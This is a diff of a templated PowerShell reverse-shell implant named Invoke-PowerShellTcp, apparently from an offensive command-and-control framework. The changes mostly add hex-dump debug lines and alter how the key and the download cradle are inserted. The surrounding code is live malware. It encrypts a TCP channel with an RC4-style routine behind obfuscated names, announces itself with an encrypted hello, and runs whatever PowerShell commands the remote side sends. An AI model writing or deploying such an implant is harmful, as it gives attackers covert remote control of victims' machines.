@@ -2,12 +2,13 @@
 
 {{'$DebugPreference = "Continue"'|debug}}
 
-$KEY = ([system.Text.Encoding]::UTF8).GetBytes("{{key}}")
+$KEY = ${{symbol_name("KEY")}}
+{% set stage2 = "h" %}
 $DL_CRADLE = @'
-{{dl_cradle}}
 '@
 
-{% include "powershell/rc4.ps1" %}
+# write-host $DL_CRADLE
+
 Set-Alias -Name Decrypt-Code -Value {{symbol_name("Decrypt-Code")}}
 
 $elements = @{ # bson elements
@@ -168,7 +169,7 @@ function Invoke-PowerShellTcp
         $body = $enc_packet_length
         $body += $bytes[0 .. ($len-5)]
         $body = Decrypt-Code $body $KEY
-        {{'Write-Debug "Read: $($enc.getstring($body))"'|debug}}
+        {{'Write-Debug "Read:`r`n$($enc.getstring($body)|format-hex)"'|debug}}
         $result = ConvertFrom-Bson $body
         return $result
     }
@@ -180,7 +181,7 @@ function Invoke-PowerShellTcp
         )
         $body = [byte[]](ConvertTo-Bson $Packet)
 
-        {{'Write-Debug "Sending:  $($enc.getstring($body))"'|debug}}
+        {{'Write-Debug "Sending:`r`n$($enc.getstring($body)|format-hex)"'|debug}}
         $body = Decrypt-Code $body $KEY
         $Stream.Write($body, 0, $body.length)
         $Stream.Flush()
@@ -247,12 +248,13 @@ function Invoke-PowerShellTcp
 
         $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
         $data = ""
-        while ( $packet = (Read-ShellPacket  $stream)[2] ) {
+        while ( $packet = (Read-ShellPacket $stream) ) {
             $output = ""
             if ($packet.msg_type -eq "COMMAND") {
                 $data = $packet.data
 
                 #Execute the command on the target.
+                {{'Write-Debug "Execute:`r`n$($data|format-hex)"'|debug}}
                 $PowerShell.Commands.Clear()
                 [void]$PowerShell.AddScript($data)
                 $output = ( $PowerShell.Invoke() | Out-String -Width $packet.width)
@@ -321,7 +323,9 @@ function Invoke-PowerShellTcp
         $stream = $client.GetStream()
         # this the shell hello
         $shell_hello = [byte[]](0x21,0x9e,0x10,0x55,0x75,0x6a,0x1a,0x6b)
+        {{'Write-Debug "$($shell_hello|format-hex)"'|debug}}
         $shell_hello = Decrypt-Code $shell_hello $KEY
+        {{'Write-Debug "$($shell_hello|format-hex)"'|debug}}
         $stream.Write($shell_hello, 0, $shell_hello.length)
         [byte[]]$bytes = 0..1024|%{0}
 
